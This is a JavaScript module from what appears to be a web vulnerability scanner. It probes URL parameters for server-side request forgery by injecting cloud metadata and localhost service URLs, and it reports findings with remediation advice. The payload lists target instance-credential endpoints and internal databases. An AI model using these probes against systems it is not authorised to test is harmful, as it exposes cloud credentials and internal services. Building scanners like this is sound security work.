/**
 * Feature 7C — Server-Side Request Forgery (SSRF) Scanner Module
 *
 * Targets URL-like parameters by name heuristic.
 * Probes cloud metadata endpoints and localhost services.
 * Detects via response body keywords and timing anomalies.
 */

import { sendProbe, extractParams, makeFinding } from './index.js';
import { SSRF_PARAM_NAMES, AWS_METADATA_KEYS } from '#shared/webConstants.js';

// ─── Payload sets ──────────────────────────────────────────────────────────────

const CLOUD_METADATA_PROBES = [
  { url: 'http://169.254.169.254/latest/meta-data/', label: 'AWS EC2 metadata' },
  { url: 'http://169.254.169.254/metadata/v1/', label: 'DigitalOcean metadata' },
  { url: 'http://metadata.google.internal/computeMetadata/v1/', label: 'GCP metadata', headers: { 'Metadata-Flavor': 'Google' } },
  { url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', label: 'Azure IMDS' },
];

const LOCALHOST_PROBES = [
  { url: 'http://127.0.0.1:6379/', label: 'Redis' },
  { url: 'http://127.0.0.1:9200/', label: 'Elasticsearch' },
  { url: 'http://127.0.0.1:27017/', label: 'MongoDB' },
  { url: 'http://localhost:8080/', label: 'localhost:8080' },
];

// AWS metadata response keywords
const METADATA_KEYWORDS = [...AWS_METADATA_KEYS, 'computeMetadata', 'instanceId', 'subscriptionId', 'project/project-id'];

// ─── Module runner ─────────────────────────────────────────────────────────────

export async function runSsrf(target, opts) {
  const { signal, timeoutMs, oastCallbackUrl } = opts;
  const findings = [];
  const params   = extractParams(target);

  // Filter to URL-like parameters only
  const urlParams = params.filter(p =>
    SSRF_PARAM_NAMES.some(n => p.name.toLowerCase().includes(n.toLowerCase()))
  );

  if (!urlParams.length) return findings;

  for (const param of urlParams) {
    if (signal?.aborted) break;

    // ── 1. Cloud metadata probes ─────────────────────────────────────────────
    for (const probe of CLOUD_METADATA_PROBES) {
      if (signal?.aborted) break;
      const injected = param.inject(probe.url);
      try {
        const resp = await sendProbe(
          { method: injected.method || target.method, url: injected.url, headers: injected.requestHeaders || target.requestHeaders, body: injected.body, timeoutMs: Math.min(timeoutMs, 5000) },
          signal,
        );
        if (METADATA_KEYWORDS.some(kw => resp.body.includes(kw))) {
          findings.push(makeFinding({
            severity:    'critical',
            type:        'ssrf',
            title:       `SSRF — ${probe.label} Accessible via parameter "${param.name}"`,
            description: `The "${param.name}" parameter accepts URLs and can be used to make the server fetch internal cloud metadata (${probe.label}). This exposes instance credentials and environment configuration.`,
            url:         target.url,
            parameter:   param.name,
            payload:     probe.url,
            evidence:    {
              request:  `${target.method} ${target.url}`,
              response: resp.body.slice(0, 500),
            },
            remediation: 'Implement a strict URL allowlist. Block access to 169.254.x.x and metadata.google.internal. Use IMDSv2 with required session tokens.',
            references:  ['CWE-918', 'OWASP A10:2021'],
          }));
          break;
        }
      } catch (err) {
        if (err.name === 'AbortError') return findings;
        // Connection refused / timeout to internal address is expected and ignored
      }
    }

    // ── 2. Timing-based blind SSRF (internal service timing) ─────────────────
    if (!findings.some(f => f.parameter === param.name && f.type === 'ssrf' && f.severity === 'critical')) {
      // Establish baseline with an external unreachable address
      let baselineMs = timeoutMs;
      try {
        const t0 = Date.now();
        await sendProbe(
          { method: target.method, url: target.url, headers: target.requestHeaders, body: target.body, timeoutMs: 3000 },
          signal,
        );
        baselineMs = Date.now() - t0;
      } catch {}

      // Try an internal address — fast response = server can reach it
      for (const probe of LOCALHOST_PROBES) {
        if (signal?.aborted) break;
        const injected = param.inject(probe.url);
        try {
          const t0   = Date.now();
          const resp = await sendProbe(
            { method: injected.method || target.method, url: injected.url, headers: injected.requestHeaders || target.requestHeaders, body: injected.body, timeoutMs: 3000 },
            signal,
          );
          const elapsed = Date.now() - t0;

          // If we got a very fast response to an internal address, it may be reachable
          if (resp.statusCode < 500 && elapsed < baselineMs + 500) {
            findings.push(makeFinding({
              severity:    'high',
              type:        'ssrf',
              title:       `Potential Blind SSRF — Internal Service Reachable (${probe.label}) via "${param.name}"`,
              description: `Injecting an internal service URL (${probe.url}) into parameter "${param.name}" produced a ${resp.statusCode} response in ${elapsed}ms, suggesting the server can reach internal network resources.`,
              url:         target.url,
              parameter:   param.name,
              payload:     probe.url,
              evidence:    {
                request:   `${target.method} ${target.url}`,
                response:  `HTTP ${resp.statusCode} — ${elapsed}ms`,
                timingMs:  elapsed,
              },
              remediation: 'Implement a URL allowlist. Deny requests to RFC-1918 and loopback addresses.',
              references:  ['CWE-918', 'OWASP A10:2021'],
            }));
            break;
          }
        } catch (err) {
          if (err.name === 'AbortError') return findings;
        }
      }
    }

    // ── 3. OAST callback (blind SSRF) ────────────────────────────────────────
    if (oastCallbackUrl && !findings.some(f => f.parameter === param.name && f.type === 'ssrf')) {
      const callbackUrl = `${oastCallbackUrl}/ssrf-${crypto.randomUUID().slice(0,8)}`;
      const injected = param.inject(callbackUrl);
      try {
        await sendProbe(
          { method: injected.method || target.method, url: injected.url, headers: injected.requestHeaders || target.requestHeaders, body: injected.body, timeoutMs },
          signal,
        );
        // OAST callback detection is handled by oastServer; we just emit an INFO finding
        findings.push(makeFinding({
          severity:    'info',
          type:        'ssrf',
          title:       `SSRF OAST Probe Sent for parameter "${param.name}"`,
          description: `An out-of-band callback URL was injected into "${param.name}". Monitor the OAST panel for an incoming request, which would confirm blind SSRF.`,
          url:         target.url,
          parameter:   param.name,
          payload:     callbackUrl,
          evidence:    { oastUrl: callbackUrl },
          remediation: 'Implement a URL allowlist. Block all outbound requests to untrusted hosts.',
          references:  ['CWE-918', 'OWASP A10:2021'],
        }));
      } catch (err) {
        if (err.name === 'AbortError') return findings;
      }
    }
  }

  return findings;
}
